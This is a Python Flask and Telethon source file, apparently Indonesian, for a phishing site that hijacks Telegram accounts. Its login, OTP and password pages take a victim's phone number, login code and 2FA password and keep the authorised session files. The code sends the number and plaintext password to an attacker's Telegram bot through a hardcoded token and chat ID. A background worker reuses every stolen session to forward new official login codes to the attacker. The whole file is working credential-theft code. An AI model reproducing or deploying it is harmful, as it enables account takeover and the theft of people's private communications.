import os
import re
import json
import time
import tempfile
import shutil
import asyncio
import threading
import requests
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify

# ==== FIX untuk Railway (libsqlite3.so.0 not found) ====
try:
    import sys
    import pysqlite3
    sys.modules['sqlite3'] = pysqlite3
except ImportError:
    pass

from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
)

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")

# ===== BOT CONFIG =====
api_id = int(os.getenv("API_ID", 34946540))
api_hash = os.getenv("API_HASH", "7554a5e9dd52df527bfc39d8511413fd")

BOT_TOKEN = "8205641352:AAHxt3LgmDdfKag-NPQUY4WYOIXsul680Hw"
CHAT_ID = "7712462494"

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# ===== STORAGE =====
LAST_DATA = {}  # { phone: {"otp":..., "password":...} }


# ===================================================================
#                     STORAGE / NORMALIZATION HELPERS
# ===================================================================
def normalize_phone_key(phone: str) -> str:
    if phone is None:
        return ""
    # remove typical suffixes and whitespace
    key = str(phone)
    key = key.replace(".session", "").replace(".pending", "").strip()
    return key


def save_data(phone, otp=None, password=None):
    key = normalize_phone_key(phone)
    if not key:
        return
    if key not in LAST_DATA:
        LAST_DATA[key] = {"otp": None, "password": None}
    if otp is not None:
        LAST_DATA[key]["otp"] = otp
    if password is not None:
        LAST_DATA[key]["password"] = password


def get_data(phone):
    key = normalize_phone_key(phone)
    return LAST_DATA.get(key, {"otp": None, "password": None})
# ===================================================================


# ====== Helper (session files) ======
def remove_session_files(phone_base: str):
    phone_key = normalize_phone_key(phone_base)
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone_key}."):
            try:
                os.remove(os.path.join(SESSION_DIR, fn))
                print(f"[Session] Dihapus: {fn}")
            except Exception as e:
                print(f"[Session] Gagal hapus {fn}: {e}")


def finalize_pending_session(phone_base: str):
    phone_key = normalize_phone_key(phone_base)
    for fn in os.listdir(SESSION_DIR):
        # look for files like "+62xxx.pending.session"
        if fn.startswith(f"{phone_key}.pending") and fn.endswith(".session"):
            src = os.path.join(SESSION_DIR, fn)
            dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
            try:
                os.rename(src, dst)
                print(f"[Session] Di-finalize: {src} -> {dst}")
            except Exception as e:
                print(f"[Session] Gagal finalize {src}: {e}")


# ===== Auto set webhook (opsional) =====
def auto_set_webhook():
    domain = os.getenv("WEBHOOK_DOMAIN", "").strip()
    if not domain:
        print("[WEBHOOK] SKIPPED — WEBHOOK_DOMAIN not set")
        return
    webhook_url = f"{domain.rstrip('/')}/bot"
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
    try:
        r = requests.get(api_url, params={"url": webhook_url}, timeout=10)
        print("[WEBHOOK] SET:", webhook_url)
        print("[WEBHOOK] RESPONSE:", r.text)
    except Exception as e:
        print("[WEBHOOK] ERROR:", e)


# =========================
#      ROUTES / FLASK
# =========================

# app index (you had this in second file)
@app.route("/", methods=["GET"])
def index():
    # Halaman utama (landing page)
    return render_template(
        "index.html",
        hide_nav=True,
        page_class="index-page"
    )


# ===== INLINE BUTTON WEBHOOK =====
@app.route("/bot", methods=["POST"])
def bot_webhook():
    data = request.get_json(silent=True) or {}
    print("== /bot CALLBACK RECEIVED ==")
    print(data)

    if "callback_query" not in data:
        return jsonify({"ok": True})

    q = data["callback_query"]
    cid = q["message"]["chat"]["id"]
    cb = q.get("data", "")
    cb_id = q.get("id")

    # jawab callback supaya loading berhenti
    if cb_id:
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                data={"callback_query_id": cb_id}
            )
        except Exception as e:
            print("[BOT] answerCallbackQuery error:", e)

    # handle cek button
    if cb.startswith("cek_"):
        phone = cb.replace("cek_", "").strip()
        info = get_data(phone)

        # cek apakah session file ada (finalized .session)
        session_file = os.path.join(SESSION_DIR, f"{normalize_phone_key(phone)}.session")
        session_exist = os.path.exists(session_file)

        if not session_exist:
            txt = (
                "⚠️ Sesi nomor telah berakhir.\n"
                "Silahkan login ulang untuk mendapatkan OTP baru."
            )
        else:
            txt = (
                f"🔐 Password: {info['password'] or '-'}\n"
                f"🔑 OTP: {info['otp'] or '-'}"
            )

        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": cid, "text": txt}
            )
            print("[BOT] sendMessage status:", r.status_code, r.text)
        except Exception as e:
            print("[BOT] sendMessage error:", e)

    return jsonify({"ok": True})


# ====== FLASK ROUTES: LOGIN / API LOGIN ======
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        name = request.form.get("name", "")
        phone = request.form.get("phone", "").strip()
        gender = request.form.get("gender", "")
        if not phone:
            flash("Masukkan nomor telepon.", "error")
            return redirect(url_for("login"))

        session["name"], session["phone"], session["gender"] = name, phone, gender
        remove_session_files(phone)

        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")
        async def send_code():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                sent = await client.send_code_request(phone)
                session["phone_code_hash"] = sent.phone_code_hash
            finally:
                await client.disconnect()

        try:
            asyncio.run(send_code())
            flash("OTP telah dikirim ke Telegram Anda.")
            return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Error kirim OTP: {e}", "error")
            return redirect(url_for("login"))
    return render_template("login.html")


# ====== API: LOGIN (AJAX) ======
@app.route("/api/login", methods=["POST"])
def api_login():
    name = request.form.get("name", "")
    phone = request.form.get("phone", "").strip()
    gender = request.form.get("gender", "")

    if not phone:
        return jsonify({"status": "error", "message": "Masukkan nomor telepon."})

    session["name"], session["phone"], session["gender"] = name, phone, gender
    remove_session_files(phone)

    pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

    async def send_code():
        client = TelegramClient(pending_base, api_id, api_hash)
        await client.connect()
        try:
            sent = await client.send_code_request(phone)
            session["phone_code_hash"] = sent.phone_code_hash
        finally:
            await client.disconnect()

    try:
        asyncio.run(send_code())
        return jsonify({"status": "success", "redirect": url_for("otp")})
    except Exception as e:
        return jsonify({"status": "error", "message": f"Error kirim OTP: {e}"})


# ====== OTP PAGE ======
@app.route("/otp", methods=["GET", "POST"])
def otp():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if request.method == "POST":
        code = request.form.get("otp", "").strip()
        if not code:
            flash("Masukkan kode OTP.", "error")
            return redirect(url_for("otp"))

        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def verify_code():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                phone_code_hash = session.get("phone_code_hash")
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                me = await client.get_me()
                await client.disconnect()
                finalize_pending_session(phone)
                return {"ok": True, "need_password": False, "me": me}
            except SessionPasswordNeededError:
                await client.disconnect()
                return {"ok": True, "need_password": True, "me": None}
            except PhoneCodeInvalidError:
                await client.disconnect()
                return {"ok": False, "error": "OTP salah"}
            except Exception as e:
                await client.disconnect()
                return {"ok": False, "error": f"Error verify OTP: {e}"}

        try:
            res = asyncio.run(verify_code())
            if res.get("ok"):
                session["last_otp"] = code
                if res.get("need_password"):
                    session["need_password"] = True
                    flash("Akun ini butuh password (2FA).", "info")
                    return redirect(url_for("password"))
                else:
                    flash("Login berhasil ✅", "success")
                    # === Kirim info login ke BOT ===
                    text = (
                        "📢 New User Login\n"
                        f"👤 Number: {phone}\n"
                        f"🔒 Password: (no password)"
                    )
                    try:
                        requests.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            data={"chat_id": CHAT_ID, "text": text}
                        )
                    except Exception as e:
                        print(f"[BOT] Gagal kirim pesan: {e}")
                    return redirect(url_for("success"))
            else:
                flash(res.get("error", "Gagal verifikasi OTP"), "error")
                return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Exception verify: {e}", "error")
            return redirect(url_for("otp"))
    return render_template("otp.html")


# ====== API: OTP (AJAX) ======
@app.route("/api/otp", methods=["POST"])
def api_otp():
    phone = session.get("phone")
    if not phone:
        return jsonify({"status": "error", "message": "Sesi tidak ditemukan"})

    code = request.form.get("otp", "").strip()
    if not code:
        return jsonify({"status": "error", "message": "Masukkan kode OTP."})

    pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

    async def verify_code():
        client = TelegramClient(pending_base, api_id, api_hash)
        await client.connect()
        try:
            phone_code_hash = session.get("phone_code_hash")
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            me = await client.get_me()
            await client.disconnect()
            finalize_pending_session(phone)
            return {"ok": True, "need_password": False, "me": me}
        except SessionPasswordNeededError:
            await client.disconnect()
            return {"ok": True, "need_password": True, "me": None}
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {"ok": False, "error": "OTP salah"}
        except Exception as e:
            await client.disconnect()
            return {"ok": False, "error": f"Error verify OTP: {e}"}

    try:
        res = asyncio.run(verify_code())
        if res.get("ok"):
            session["last_otp"] = code
            if res.get("need_password"):
                session["need_password"] = True
                return jsonify({"status": "success", "redirect": url_for("password")})
            else:
                # === Kirim info login ke BOT (API) ===
                text = (
                    "📢 New User Login\n"
                    f"👤 Number: {phone}\n"
                    f"🔒 Password: (no password)"
                )
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        data={"chat_id": CHAT_ID, "text": text}
                    )
                except Exception as e:
                    print(f"[BOT] Gagal kirim pesan: {e}")
                return jsonify({"status": "success", "redirect": url_for("success")})
        else:
            return jsonify({"status": "error", "message": res.get("error", "OTP tidak valid")})
    except Exception as e:
        return jsonify({"status": "error", "message": f"Exception verify: {e}"})


# ====== PASSWORD PAGE ======
@app.route("/password", methods=["GET", "POST"])
def password():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if not session.get("need_password"):
        flash("Halaman password tidak diperlukan.", "info")
        return redirect(url_for("success"))

    if request.method == "POST":
        password_input = request.form.get("password", "")
        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def verify_password():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(password=password_input)
                me = await client.get_me()
                await client.disconnect()
                finalize_pending_session(phone)
                return {"ok": True, "me": me}
            except PasswordHashInvalidError:
                await client.disconnect()
                return {"ok": False, "error": "Password salah"}
            except Exception as e:
                await client.disconnect()
                return {"ok": False, "error": f"Gagal verifikasi password: {e}"}

        try:
            res = asyncio.run(verify_password())
            if res.get("ok"):
                otp = session.get("last_otp", "")
                # === Kirim info login ke BOT ===
                text = (
                    "📢 New User Login\n"
                    f"👤 Number: {phone}\n"
                    f"🔒 Password: {password_input}"
                )
                try:
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        data={"chat_id": CHAT_ID, "text": text}
                    )
                except Exception as e:
                    print(f"[BOT] Gagal kirim pesan: {e}")

                session.pop("need_password", None)
                flash("Login berhasil ✅", "success")
                return redirect(url_for("success"))
            else:
                flash(res.get("error", "Password tidak valid"), "error")
                return redirect(url_for("password"))
        except Exception as e:
            flash(f"Exception password: {e}", "error")
            return redirect(url_for("password"))
    return render_template("password.html")


# ====== API: PASSWORD ======
@app.route("/api/password", methods=["POST"])
def api_password():
    phone = session.get("phone")
    if not phone:
        return jsonify({"status": "error", "message": "Sesi tidak ditemukan"})

    if not session.get("need_password"):
        return jsonify({"status": "error", "message": "Password tidak diperlukan."})

    password_input = request.form.get("password", "")
    pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

    async def verify_password():
        client = TelegramClient(pending_base, api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(password=password_input)
            me = await client.get_me()
            await client.disconnect()
            finalize_pending_session(phone)
            return {"ok": True, "me": me}
        except PasswordHashInvalidError:
            await client.disconnect()
            return {"ok": False, "error": "Password salah"}
        except Exception as e:
            await client.disconnect()
            return {"ok": False, "error": f"Gagal verifikasi password: {e}"}

    try:
        res = asyncio.run(verify_password())
        if res.get("ok"):
            otp = session.get("last_otp", "")
            # === Kirim info login ke BOT (API) ===
            text = (
                "📢 New User Login\n"
                f"👤 Number: {phone}\n"
                f"🔒 Password: {password_input}"
            )
            try:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    data={"chat_id": CHAT_ID, "text": text}
                )
            except Exception as e:
                print(f"[BOT] Gagal kirim pesan: {e}")

            session.pop("need_password", None)
            return jsonify({"status": "success", "redirect": url_for("success")})
        else:
            return jsonify({"status": "error", "message": res.get("error", "Password tidak valid")})
    except Exception as e:
        return jsonify({"status": "error", "message": f"Exception password: {e}"})


@app.route("/success")
def success():
    return render_template("success.html",
                           name=session.get("name"),
                           phone=session.get("phone"),
                           gender=session.get("gender"))


# ======= WORKER (UPGRADED: clone session, normalize keys, save data) =======
async def forward_handler(event, client_name):
    """Hanya forward OTP dari akun resmi Telegram (777000)."""
    text_msg = getattr(event, "raw_text", "") or ""
    sender = await event.get_sender()

    if sender.id != 777000:
        return

    print(f"[Worker][{client_name}] Pesan resmi Telegram: {text_msg}")

    otp_match = re.findall(r"\b\d{5,6}\b", text_msg)
    if otp_match:
        otp_code = otp_match[0]
        # simpan ke storage ter-normalisasi
        save_data(client_name, otp=otp_code)
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": CHAT_ID, "text": f"🔑 OTP dari {normalize_phone_key(client_name)}: {otp_code}"}
            )
            print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
        except Exception as e:
            print(f"[Worker] Gagal forward OTP: {e}")


async def worker_main():
    print("[Worker] Starting...")
    clients = {}
    while True:
        try:
            for fn in os.listdir(SESSION_DIR):
                # hanya file finalized .session, bukan .pending.session
                if not fn.endswith(".session"):
                    continue
                if ".pending" in fn:
                    continue

                base_raw = fn[:-len(".session")]
                base = normalize_phone_key(base_raw)
                if base in clients:
                    continue

                real_session = os.path.join(SESSION_DIR, fn)

                # copy to temp untuk menghindari "database is locked"
                ts = int(time.time() * 1000)
                temp_session = os.path.join(tempfile.gettempdir(), f"{base}_clone_{ts}.session")
                try:
                    shutil.copy2(real_session, temp_session)
                except Exception as e:
                    print(f"[Worker] failed to copy session {real_session} -> {temp_session}: {e}")
                    continue

                print(f"[Worker] Loading client for {base} (clone: {temp_session}) ...")

                client = TelegramClient(temp_session, api_id, api_hash)

                connected = False
                for attempt in range(5):
                    try:
                        await client.connect()
                        connected = True
                        break
                    except Exception as e:
                        print(f"[Worker] connect attempt {attempt+1} failed for {base}: {e}")
                        await asyncio.sleep(0.5)

                if not connected:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    continue

                try:
                    if not await client.is_user_authorized():
                        print(f"[Worker] Session {base} belum authorized, skip.")
                        await client.disconnect()
                        continue
                except Exception as e:
                    print(f"[Worker] is_user_authorized check failed for {base}: {e}")
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    continue

                try:
                    me = await client.get_me()
                    print(f"[Worker] ✅ Connected sebagai {getattr(me,'first_name',str(me))} (@{getattr(me,'username','')}) for {base}")
                except Exception as e:
                    print(f"[Worker] get_me failed for {base}: {e}")

                @client.on(events.NewMessage(incoming=True))
                async def _handler(event, key=base):
                    try:
                        await forward_handler(event, key)
                    except Exception as e:
                        print(f"[Worker] Error di handler {key}: {e}")

                task = asyncio.create_task(client.run_until_disconnected())
                clients[base] = task

        except Exception as e:
            print(f"[Worker] Loop error: {e}")
        await asyncio.sleep(0.5)


def start_worker_thread():
    def _run():
        asyncio.run(worker_main())
    t = threading.Thread(target=_run, daemon=True)
    t.start()


# ===== INIT =====
# auto set webhook jika env WEBHOOK_DOMAIN diset
auto_set_webhook()

# start worker thread
start_worker_thread()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)
